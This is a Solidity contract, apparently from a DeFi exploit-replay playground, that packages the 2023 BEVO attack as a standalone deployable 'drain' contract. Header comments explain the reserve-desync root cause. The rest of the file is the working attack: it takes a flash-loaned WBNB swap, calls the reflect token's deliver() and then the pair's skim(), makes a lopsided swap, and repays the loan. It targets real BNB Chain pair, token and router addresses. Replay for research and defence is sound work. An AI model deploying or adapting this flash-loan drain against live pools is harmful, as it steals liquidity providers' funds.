// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-01-BEVO).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (BEVOExploit IS the Test contract; the flash-swap callback `pancakeCall`
// lives on the test itself), so there is no standalone contract to deploy.
// This contract is a faithful, self-contained copy of that inline attack
// (testExploit -> run, pancakeCall unchanged) so the playground can deploy
// it and record run(). Logic and constants are copied verbatim from
// test/BEVO_exp.sol.
//
// Root cause: BEVO is a reflect-style token whose `deliver()` redistributes
// the caller's own balance to all holders (via a rebasing reflection
// mechanism) without going through transfer(), so PancakePair's cached
// reserves become stale relative to its real token balance. Calling
// `skim()` on the BEVO-WBNB pair after `deliver()` lets the attacker pull
// out the pair's now-understated WBNB reserve, and a final lopsided
// `swap()` drains the pair further -- netting a WBNB profit with only a
// flash-loaned WBNB position and no real capital.

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface reflectiveERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function deliver(uint256 tAmount) external;
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract BEVODrain {
    IERC20 private constant wbnb = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    reflectiveERC20 private constant bevo = reflectiveERC20(0xc6Cb12df4520B7Bf83f64C79c585b8462e18B6Aa);
    IUniswapV2Pair private constant wbnb_usdc = IUniswapV2Pair(0xd99c7F6C65857AC913a8f880A4cb84032AB2FC5b);
    IUniswapV2Pair private constant bevo_wbnb = IUniswapV2Pair(0xA6eB184a4b8881C0a4F7F12bBF682FD31De7a633);
    IPancakeRouter private constant router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    // step 0: flashloan WBNB from the WBNB-USDC PancakePair; pancakeCall does the drain.
    function run() external {
        wbnb.approve(address(router), type(uint256).max);
        wbnb_usdc.swap(0, 192.5 ether, address(this), new bytes(1));
    }

    function pancakeCall(
        address, /*sender*/
        uint256, /*amount0*/
        uint256, /*amount1*/
        bytes calldata /*data*/
    ) external {
        // step 1: dump the flash-loaned WBNB into the BEVO-WBNB pair for BEVO.
        address[] memory path = new address[](2);
        path[0] = address(wbnb);
        path[1] = address(bevo);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            wbnb.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );

        // step 2: deliver() redistributes our BEVO balance to all holders via the
        // reflection mechanism (not transfer()), leaving the pair's cached
        // reserve stale relative to its true balance.
        bevo.deliver(bevo.balanceOf(address(this)));
        // step 3: skim() pays out the pair's balance in excess of its reserves --
        // the staleness from deliver() lets us pull real WBNB out for free.
        bevo_wbnb.skim(address(this));
        bevo.deliver(bevo.balanceOf(address(this)));
        // step 4: a final lopsided swap drains more WBNB from the desynced pair.
        bevo_wbnb.swap(337 ether, 0, address(this), "");

        // step 5: repay the flash loan; whatever WBNB remains is the profit.
        wbnb.transfer(address(wbnb_usdc), 193 ether);
    }
}
